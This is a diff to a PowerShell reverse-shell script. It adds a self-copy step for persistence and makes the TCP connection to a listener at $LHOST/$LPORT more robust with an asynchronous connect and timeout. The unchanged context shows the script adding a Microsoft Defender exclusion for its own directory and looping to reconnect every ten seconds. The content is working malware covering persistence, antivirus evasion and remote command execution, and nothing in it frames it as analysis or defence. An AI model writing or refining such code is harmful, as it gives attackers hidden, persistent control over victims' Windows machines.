@@ -23,6 +23,12 @@ if (-not (Test-Path $WorkDir)) {
     New-Item -Path $WorkDir -ItemType Directory -Force | Out-Null
 }
 
+# SELF-COPY: The persistence task needs the file to exist at $FullPath
+if ($PSCommandPath -and ($PSCommandPath -ne $FullPath)) {
+    Log-Debug "Copying script to $FullPath for persistence..."
+    Copy-Item -Path $PSCommandPath -Destination $FullPath -Force
+}
+
 # Add self-exclusion to Microsoft Defender
 try {
     Log-Debug "Adding Defender exclusion for $WorkDir"
@@ -78,7 +84,16 @@ while ($true) {
     try {
         # Attempt connection
         Log-Debug "Attempting to connect to listener..."
-        $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
+        $client = New-Object System.Net.Sockets.TCPClient
+        $connection = $client.BeginConnect($LHOST, $LPORT, $null, $null)
+        $wait = $connection.AsyncWaitHandle.WaitOne(3000, $false) # 3 second timeout
+
+        if (-not $wait) {
+            $client.Close()
+            throw "Connection timed out"
+        }
+
+        $client.EndConnect($connection)
         $stream = $client.GetStream()
         $reader = New-Object System.IO.StreamReader($stream)
         $writer = New-Object System.IO.StreamWriter($stream)
@@ -119,7 +134,7 @@ while ($true) {
             $writer.Write($output)
         }
     } catch {
-        Log-Debug "Connection failed or lost. Retrying in 10s..."
+        Log-Debug "Connection failed ($($_.Exception.Message)). Retrying in 10s..."
         Start-Sleep -Seconds 10
     } finally {
         if ($null -ne $client) { $client.Close() }
